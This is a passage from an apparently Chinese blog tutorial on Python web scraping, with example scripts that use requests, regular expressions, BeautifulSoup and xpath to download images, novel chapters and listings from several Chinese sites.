data-num="20"></td><td><pre>   json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>list_data<span class="token punctuation">,</span>fp<span class="token operator">=</span>fp<span class="token punctuation">,</span>ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'生成！！'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/4a6392aa79dcb641.png" alt="" /></p>
<h1 id="数据解析"><a class="anchor" href="#数据解析">#</a> 数据解析</h1>
<h2 id="数据解析原理概述"><a class="anchor" href="#数据解析原理概述">#</a> 数据解析原理概述</h2>
<ul>
<li>解析的局部的文本内容都会在标签之间或者标签对应的属性中进行存储</li>
<li>1. 进行指定标签的定位</li>
<li>2. 标签或者标签对应的属性中存储的数据进行提取（解析）</li>
</ul>
<h2 id="使用流程-2"><a class="anchor" href="#使用流程-2">#</a> 使用流程</h2>
<ul>
<li>
<p>指定 url</p>
</li>
<li>
<p>发起请求</p>
</li>
<li>
<p>获取响应数据</p>
</li>
<li>
<p>数据解析</p>
</li>
<li>
<p>持久化存储</p>
<ul>
<li>聚焦爬虫</li>
<li>爬取页面中指定的页面内容</li>
</ul>
</li>
</ul>
<h2 id="编写-4"><a class="anchor" href="#编写-4">#</a> 编写</h2>
<p>爬取页面图片</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token comment">#UA 伪装：将对应的 user-agent 封装到一个字典中</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0'</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    url <span class="token operator">=</span> <span class="token string">'https://blog.lxscloud.top/static/post/esp32_cam/360%E6%88%AA%E5%9B%BE16810304334270.jpg'</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    img_data <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content</pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token comment">#content 返回的是二进制形式的图片数据</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token comment">#text (字符串) content (二进制) json (对象)</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./my.jpg'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>  <span class="token comment">#wb 以二进制格式打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>img_data<span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="正则"><a class="anchor" href="#正则">#</a> 正则</h3>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/01/9b30b8f12654b1e1.jpg" alt="" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQ4MjE5NDAxL2Fuc3dlci83NDI0NDQzMjY=">参考此篇学习正则</span></p>
<p>正则解析：</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>thumb<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/article/125091174<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//pic.qiushibaike.com/system/pictures/12509/125091174/medium/Z9FEKWUBTD8D11QV.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>糗事#125091174<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>illustration<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>auto<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>ex = '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>thumb<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>.*?'&lt;img src="(.*?)" alt.*?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>div>'</pre></td></tr></table></figure><h2 id="编写-5"><a class="anchor" href="#编写-5">#</a> 编写</h2>
<p>用正则爬取指定页面所有图片</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> re</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">#创建一个文件夹，保存所有的图片</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'./qiutuLibs'</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'./qiutuLibs'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    url <span class="token operator">=</span> <span class="token string">'https://www.qiushibaike.com/imgrank/page/%d/'</span>  <span class="token comment">#处理分页</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0'</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">for</span> pageNum <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token comment">#对应页码的 url</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        new_url <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>url<span class="token operator">%</span>pageNum<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>        page_text <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>new_url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text <span class="token comment">#使用通用爬虫对 url 对应的一张页面进行爬取</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>        ex <span class="token operator">=</span> <span class="token string">'&lt;div class="thumb">.*?&lt;img src="(.*?)" alt.*?&lt;/div>'</span> <span class="token comment">#聚焦爬虫将页面中所有图进行提取</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>        img_src_list <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>ex<span class="token punctuation">,</span>page_text<span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span> <span class="token comment">#re.S 单行匹配正则，re.M 多行匹配正则</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">for</span> src <span class="token keyword">in</span> img_src_list<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>           src <span class="token operator">=</span> <span class="token string">'https:'</span> <span class="token operator">+</span> src <span class="token comment">#拼接图片完整路径</span></pre></td></tr><tr><td data-num="26"></td><td><pre>           img_data <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>src<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>content <span class="token comment">#返回的是二进制形式的图片数据</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre>           img_name <span class="token operator">=</span> src<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment">#生成图片名称</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>           img_path <span class="token operator">=</span> <span class="token string">'./qiutuLibs/'</span> <span class="token operator">+</span> img_name <span class="token comment">#生成存储路径</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre>           <span class="token comment">#持久化存储</span></pre></td></tr><tr><td data-num="33"></td><td><pre>           <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>img_path<span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>               fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>img_data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>               <span class="token keyword">print</span><span class="token punctuation">(</span>img_name<span class="token punctuation">,</span><span class="token string">'下载成功!!'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="bs4"><a class="anchor" href="#bs4">#</a> bs4</h3>
<p>bs4 解析</p>
<ul>
<li>
<p>数据解析的原理：</p>
<ul>
<li>1. 标签定位</li>
<li>2. 提取标签、标签属性中存储的数据值</li>
</ul>
</li>
<li>
<p>bs4 数据解析的原理：</p>
<ul>
<li>1. 实例化一个 BeautifulSoup 对象，并且将页面源码数据加载到该对象中</li>
<li>2. 通过调用 BeautifulSoup 对象中相关的属性或者方法进行标签定位和数据提取</li>
</ul>
</li>
<li>
<p>环境安装：</p>
<ul>
<li>pip install bs4</li>
<li>pip install lxml</li>
</ul>
</li>
<li>
<p>如何实例化 BeautifulSoup 对象：</p>
<ul>
<li>from bs4 import BeautifulSoup</li>
<li>对象的实例化：
<ul>
<li>1. 将本地的 html 文档中的数据加载到该对象<br />
 fp = open ('./test.html','r',encoding='utf-8')<br />
soup = BeautifulSoup(fp,'lxml')</li>
<li>2. 将互联网上网页源码的数据加载到该对象<br />
 page_text = response.text<br />
soup = BeautifulSoup(page_text,'lxml')</li>
</ul>
</li>
<li>提供的用于数据解析的方法和属性：
<ul>
<li>soup.tagName: 返回的是文档中第一次出现的 tagName 对应的标签</li>
<li>soup.find():
<ul>
<li>find ('tagName'): 等同于 soup.div</li>
<li>属性定位:
<ul>
<li>soup.find('div',class_/id/attr='song')</li>
</ul>
</li>
<li>soup.find_all ('tagName'): 返回符合要求的所有标签 (列表)</li>
</ul>
</li>
</ul>
</li>
<li>select:
<ul>
<li>select (' 某种选择器 (id,class, 标签... 选择器)'), 返回的是一个列表。</li>
<li>层级选择器:
<ul>
<li>soup.select ('.tang&gt; ul &gt; li &gt; a'): &gt; 表示的是一个层级</li>
<li>soup.select ('.tang&gt; ul a'): 空格表示的多个层级</li>
</ul>
</li>
<li>获取标签之间的文本数据:
<ul>
<li>soup.a.text/string/get_text()</li>
<li>text/get_text (): 可以获取某一个标签中的所有文本内容</li>
<li>string: 只可以获取该标签下直系的文本内容</li>
</ul>
</li>
<li>获取标签中属性值:
<ul>
<li>soup.a['href']</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="编写-6"><a class="anchor" href="#编写-6">#</a> 编写</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#爬取三国演义的所有章节及其内容</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> lxml</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0'</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    url <span class="token operator">=</span> <span class="token string">'https://www.shicimingju.com/book/sanguoyanyi.html'</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>    page_text <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token comment">#在首页中解析出章节的标题和详情页的 url</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token comment">#1. 实例化 BeautifulSoup 对象，需要将页面源码数据加载到该对象</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>page_text<span class="token punctuation">,</span><span class="token string">'lxml'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token comment">#2. 解析出详情页的标题和 url</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    li_lixt <span class="token operator">=</span> soup<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token string">'.book-mulu > ul > li'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./sanguo.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">for</span> li <span class="token keyword">in</span> li_lixt<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        title <span class="token operator">=</span> li<span class="token punctuation">.</span>a<span class="token punctuation">.</span>string</pre></td></tr><tr><td data-num="21"></td><td><pre>        d_url <span class="token operator">=</span> <span class="token string">'https://www.shicimingju.com'</span><span class="token operator">+</span>li<span class="token punctuation">.</span>a<span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token comment">#对详情页发起请求，解析出章节内容</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        d_text <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>d_url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text</pre></td></tr><tr><td data-num="24"></td><td><pre>        d_soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>d_text<span class="token punctuation">,</span><span class="token string">'lxml'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        div_tag <span class="token operator">=</span> d_soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'chapter_content'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token comment">#解析到章节内容</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        content <span class="token operator">=</span> div_tag<span class="token punctuation">.</span>text</pre></td></tr><tr><td data-num="28"></td><td><pre>        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>title<span class="token operator">+</span><span class="token string">':'</span><span class="token operator">+</span>content<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span><span class="token string">'爬取成功'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="xpath"><a class="anchor" href="#xpath">#</a> xpath</h3>
<ul>
<li>xpath 解析原理:
<ul>
<li>1. 实例化一个 etree 的对象，且需要将被解析的页面源码数据加载到该对象中。
<ul>
<li>2. 调用 etree 对象中的 xpath 方法结合着 xpath 表达式实现标签的定位和内容的捕获。</li>
</ul>
</li>
</ul>
</li>
<li>环境的安装:
<ul>
<li>pip install lxml</li>
</ul>
</li>
<li>如何实例化一个 etree 对象: from lxml import etree
<ul>
<li>1. 将本地的 html 文档中的源码数据加载到 etree 对象:<br />
etree.parse(filePath)</li>
<li>2. 可以将从互联网上获取的源码数据加载到该对象中<br />
 etree.HTML ('page_text')</li>
<li>xpath ('xpath 表达式 ')
<ul>
<li>/：表示从根节点开始定位，一个 / 表示一个层级 // 表示多个层级</li>
<li>属性定位: //div [@class='song'] --------&gt;tag [@attrName='attrValue']</li>
<li>索引定位: //div [@class='song']/p [3] 从 1 开始索引</li>
<li>取文本:
<ul>
<li>/text () 获取的是标签中直系的文本内容</li>
<li>//text () 获取标签中非直系的文本内容（所有的文本内容）</li>
</ul>
</li>
<li>取属性:<br />
/@attrName  ====&gt;  img/src</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="编写-7"><a class="anchor" href="#编写-7">#</a> 编写</h2>
<ul>
<li>58 二手房</li>
</ul>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> socket <span class="token keyword">import</span> herror</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    url <span class="token operator">=</span> <span class="token string">'https://bj.58.com/ershoufang/'</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0'</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    page_text <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>    tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>page_text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    li_list <span class="token operator">=</span> tree<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//section[@class="list"]/div'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'58.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">for</span> li <span class="token keyword">in</span> li_list<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        title <span class="token operator">=</span> li<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'./a/div[2]/div[1]/div[1]/h3/text()'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>title<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>title<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><ul>
<li>爬图片</li>
</ul>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    url <span class="token operator">=</span> <span class="token string">'https://pic.netbian.com/4kdongman/'</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0'</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    page_text <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token comment"># 数据解析:src 的属性值 alt 属性值</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>page_text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    li_list <span class="token operator">=</span> tree<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//div[@class="slist"]/ul/li'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'./picLibs'</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'./picLibs'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">for</span> li <span class="token keyword">in</span> li_list<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>       img_src <span class="token operator">=</span> <span class="token string">'https://pic.netbian.com'</span><span class="token operator">+</span>li<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'./a/img/@src'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="19"></td><td><pre>       img_name <span class="token operator">=</span> li<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'./a/img/@alt'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'.jpg'</span></pre></td></tr><tr><td data-num="20"></td><td><pre>       img_name <span class="token operator">=</span> img_name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'iso-8859-1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>      <span class="token comment"># print(img_name,img_src)</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>       img_data <span class="token operator">=</span>  requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>img_src<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>content</pre></td></tr><tr><td data-num="24"></td><td><pre>       img_path <span class="token operator">=</span> <span class="token string">'picLibs/'</span><span class="token operator">+</span>img_name</pre></td></tr><tr><td data-num="25"></td><td><pre>       <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>img_path<span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>           fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>img_data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>           <span class="token keyword">print</span><span class="token punctuation">(</span>img_name<span class="token punctuation">,</span><span class="token string">'Download succeed!'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>自己写的爬简历</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    url <span class="token operator">=</span> <span class="token string">'https://sc.chinaz.com/jianli/free_%d.html'</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0'</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td 